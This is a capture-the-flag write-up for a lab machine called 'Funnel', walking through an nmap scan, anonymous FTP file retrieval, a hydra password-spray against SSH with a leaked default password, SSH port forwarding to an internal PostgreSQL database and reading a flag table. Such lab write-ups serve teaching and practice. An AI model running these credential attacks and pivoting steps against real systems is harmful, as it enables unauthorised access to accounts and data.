
## CTF Writeup: Funnel

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.228.195
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 06:58 -0500
Nmap scan report for 10.129.228.195
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```

There is only an FTP Service & SSH running. So let's check out the FTP Service!

```
ftp 10.129.228.195
get password_policy.pdf
get welcome_28112022
```

Decided to view the .pdf file first.

```
evince password_policy.pdf
```

Retrieved an "default" password. 

```
funnel123#!#
```

Let's check out the other file. It's an e-mail from the root user to multiple new employees. Let's create an wordlist out of all users & bruteforce the ssh login via hydra.

```
cat welcome_28112022
```

```
root
otpimus
albert
andreas
christine
maria
```

Bruteforced using the wordlist and the retrieved password & gained valid credentials.

```
hydra -L users.txt -p 'funnel123#!#' ssh://10.129.228.195
```

```
christine:funnel123#!#
```

Enumerated running services and identified an internally running service on port 5432

```
netstat -tulnp
```

Let's port forward using SSH.

```
ssh -L 5432:127.0.0.1:5432 christine@10.129.228.195
```

We now can access the postgresql database from our local machine on port 5432 via localhost. 

```
psql -h 127.0.0.1 -U christine   
Password for user christine: 
psql (18.4 (Debian 18.4-1+b1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=#
```

Listed databases.

```
\l
```

Select database

```
\c secrets
```

Enum Tables

```
\dt
```

View Table

```
SELECT * FROM flag;
```

Retrieved flag.txt.

```
cf277664b1771217d7006acdea006db1
```